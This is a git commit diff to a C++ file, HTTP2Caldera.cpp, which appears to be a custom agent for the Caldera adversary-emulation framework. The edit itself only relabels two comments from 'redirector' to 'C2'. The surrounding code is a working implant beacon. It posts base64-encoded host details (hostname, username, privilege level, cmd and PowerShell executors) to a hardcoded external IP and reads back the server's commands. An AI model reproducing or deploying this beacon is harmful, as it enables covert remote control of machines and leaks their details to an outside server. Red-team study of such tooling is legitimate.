22cf99482067685cf2b735da71e5059f9bad2369
DillonSingh <100767876+DillonSingh@users.noreply.github.com>
2022-09-20 14:11:49 +0100

    Update HTTP2Caldera.cpp

--- HTTP2Caldera.cpp
+++ HTTP2Caldera.cpp
@@ -14,11 +14,11 @@ using namespace json;
 
 int main() {
 
-	// HTTP POST Request to redirector
+	// HTTP POST Request to C2
 	HINTERNET hRequest = SendRequest("http://34.248.147.52:8888/", 80, "/beacon", "POST", "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybSI6IndpbmRvd3MiLCJob3N0IjoiREVTS1RPUC1UTjFRRE9VIiwidXNlcm5hbWUiOiJhbXJ0aCIsImFyY2hpdGVjdHVyZSI6ImFtZDY0IiwicHJpdmlsZWdlIjoiVXNlciIsICJleGVjdXRvcnMiOlsiY21kIiwgInBzaCJdfQ==");
 	cout << hRequest << "\n";
 	DWORD Length = 0; 
-	// Response from redirector 
+	// Response from C2
 	char* Response = GetResponse(hRequest, &Length);
 	cout << Response << "  " << Length << "\n";
     // Decoded Base64 Response
